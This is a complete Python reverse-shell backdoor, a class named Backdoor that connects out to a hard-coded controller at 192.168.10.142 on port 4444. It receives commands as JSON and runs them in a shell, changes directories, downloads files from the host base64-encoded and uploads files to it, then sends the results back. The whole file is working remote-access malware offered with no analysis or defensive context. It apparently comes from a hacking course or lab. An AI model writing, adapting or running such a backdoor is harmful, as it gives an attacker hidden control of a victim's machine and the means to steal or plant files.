#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output
        except subprocess.CalledProcessError as e:
            return str(e.output.decode('utf-8', errors='ignore'))

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except Exception as e:
            return "[-] Error: " + str(e)

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode('utf-8')
        except Exception as e:
            return "[-] Error reading file: " + str(e)

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] File successfully uploaded: " + path
        except Exception as e:
            return "[-] Error writing to file: " + str(e)

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    directory = command[1].strip()  # Strip extra spaces
                    command_result = self.change_working_directory_to(directory)
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 2:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
                    command_result = command_result.decode('utf-8',
                                                           errors='ignore') if command_result else "Command executed with no output."
            except Exception as e:
                command_result = "[-] Error during command execution: " + str(e)

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.10.142", 4444)
my_backdoor.run()